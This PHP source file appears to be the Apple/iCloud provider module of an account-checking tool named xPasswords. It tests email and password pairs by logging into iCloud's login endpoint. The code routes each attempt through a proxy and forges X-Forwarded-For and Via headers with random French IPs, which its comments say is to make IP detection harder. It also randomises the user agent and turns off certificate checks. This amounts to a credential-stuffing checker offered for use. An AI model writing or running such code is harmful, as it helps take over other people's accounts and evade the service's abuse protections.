<?php
namespace xPasswords\Providers;

class Apple {
    
    static public $imapAddress = 'imaps://imap.mail.me.com:993';
    
    static public function authenticate($email, $password) {
        
        // Verify password complexity for iCloud and Me accounts
        // Pass must:
        // Have at least one lower case character
		// Have at least one capital letter
		// Have at least one number
        // Not contain multiple identical consecutive characters
        // Not be the same as the account name
        // Be at least 8 characters
        // Not be a common password
        $emailCheckDomain = explode('@', strtolower($email))[1];
        $emailCheckDomain = explode('.', strtolower($emailCheckDomain))[0];
        switch($emailCheckDomain) {
            case 'apple': break; // Test anyway
            case 'mac': break; // Test anyway
            
            case 'icloud': case 'me':
            if(!preg_match("/.*(?=.{8,})(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z]).*/u", $password)) {
                echo \xPasswords\Core::say('[ERROR] [PROVIDER] Password do not respect requirement for this type of account', ['color' => 'red']);
                return false;
            }
            break;
        }
        $emailCheckDomain = NULL;
        
        // Shared options
        $staticOptions = [
            'UserAgent' => \xPasswords\Core::getUserAgent(),
            'UserIP' => '78.212.' . rand(0, 255) . '.' . rand(0, 255),
            'SocksIP' => \xPasswords\Core::getProxy('Europe/France'),
        ];
                
        // Use Apple login
        $request = \Requests::post('https://setup.icloud.com/setup/ws/1/login?clientBuildNumber=14B52', [
            // Try to spoof and make the IP detection more complex
            'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
            
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
            
            'Origin' => 'https://www.icloud.com',
        ],
            // String JSON
            \xPasswords\Core::encode([
                'apple_id' => $email,
                'password' => $password,
                'extended_login' => false,
            ]),
        [
            'timeout' => 60, // 1 min timeout
            'proxy' => $staticOptions['SocksIP'],
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);

        switch($request->status_code) {
            
            case 200: // Authorized
            return true;
            break;

            case 421: // Unauthorized
            return false;
            break;

            default:
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Apple returned anormal HTTP code: ' . $request->status_code . ' for ' . $email, ['color' => 'red']);
            break;
        }
        
        return false;
    }
};